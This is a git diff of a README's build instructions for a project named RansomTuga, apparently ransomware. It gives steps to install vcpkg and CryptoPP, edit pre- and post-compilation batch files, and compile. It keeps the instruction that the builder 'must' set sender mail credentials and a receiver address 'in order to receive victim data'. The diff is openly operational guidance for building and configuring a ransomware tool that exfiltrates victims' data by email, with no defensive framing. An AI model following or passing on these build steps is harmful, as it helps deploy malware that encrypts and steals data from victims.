@@ -55,12 +55,13 @@ And many more!
 - Install vcpkg and CryptoPP using Git Bash:
   - Open  Git Bash
   - Run `git clone https://github.com/microsoft/vcpkg`
-  - Run `.\\vcpkg\\bootstrap-vcpkg.bat`
-  - Run `.\\vcpkg\\vcpkg.exe install cryptopp:x64-windows`
-  - Run `.\\vcpkg\\vcpkg.exe integrate install`
+  - Run `./vcpkg/bootstrap-vcpkg.bat`
+  - Run `./vcpkg/vcpkg.exe install cryptopp:x64-windows`
+  - Run `./vcpkg/vcpkg.exe integrate install`
 - Download the project and extract it
-- Open the project double clicking on `RansomTuga.sln`
-- Customize everything you want in `commons/common.h`, you **must** change `SENDERMAIL` `SENDERPSW` and `RECEIVERMAIL` in order to receive victim data
+- Change in the first line of `./RansomTuga/preCompilation.bat` and `./RansomTuga/postCompilation.bat` the word `py` with whatever command you use to open python in command prompt
+- Open the project double clicking on `./RansomTuga.sln`
+- Customize everything you want in `./commons/common.h`, you **must** change `SENDERMAIL` `SENDERPSW` and `RECEIVERMAIL` in order to receive victim data
 - Compile the project in `Release` and `x64`
 
 
